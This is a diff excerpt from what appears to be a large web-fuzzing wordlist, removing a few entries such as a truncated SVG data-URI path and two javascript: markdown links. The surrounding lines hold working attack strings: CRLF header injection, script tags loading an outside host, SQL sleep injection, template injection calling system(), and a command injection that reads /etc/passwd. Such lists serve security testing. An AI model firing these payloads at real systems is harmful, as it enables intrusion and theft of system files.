@@ -21561,7 +21561,6 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 /phpmyadmin/%0d
 /redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3c
 /rohanwebsite.in/%2f..%0d%0aheader-test:hacktivistro
-/wp-content/plugins/ck-offers/assets/css/%22data:image/svg+xml,%0a%3csvg%20width='9px'%20height='6px'%20viewbox='0%200%209%206'%20version='1.1'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3e%3cg%20id='v1'%20stroke='none'%20stroke-width='1'%20fill='none'%20fill-rule='evenodd'%3e%3cg%20id='mobile_collapsed'%20transform='translate(-229.000000,%20-912.000000
 /www.google.com/%2e%2e%2f%0d%0aheader-test:blatruc
 /www.rohanwebsite.in/%2e%2e%2f%0d%0aheader-test:hacktivistro
 0%0d%0a%00<script src=//h4k.in>
@@ -21667,8 +21666,6 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 <{cmd}%0d
 > 	my first attempt was adding in "uri:" and "location:" fields in
 >"><script%20%0a%0d>alert(561177485777)%3b</script>
-[test](javascript://%0d%0aprompt(1))
-[test](javascript://%0d%0aprompt(1);com)
 \'-a\u{6c}e\u{72}t(1))%0a-->
 \\nset-cookie:crlf
 \\r\\n and 1337=(select 1337 from (select sleep(120))a)
@@ -23612,5 +23609,4 @@ var str = 'javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a/
 whois_raw.cgi?fqdn=%0acat%20/etc/passwd
 whois_raw.cgi?fqdn=%0acat%20{knownfile}
 wiki/%d9%88%d9%8a%d9%83%d9%8a_%d9%be%d8%af%d9%8a%d8%a7%3a%d9%86%d8%b8%d8%b1%d8%ae%d9%88%d8%a7%d9%87%d9%8a%0a
-wp-content/plugins/ck-offers/assets/css/%22data:image/svg+xml,%0a%3csvg%20width='9px'%20height='6px'%20viewbox='0%200%209%206'%20version='1.1'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3e%3cg%20id='v1'%20stroke='none'%20stroke-width='1'%20fill='none'%20fill-rule='evenodd'%3e%3cg%20id='mobile_collapsed'%20transform='translate(-229.000000,%20-912.000000
 zazzle%0d%0a
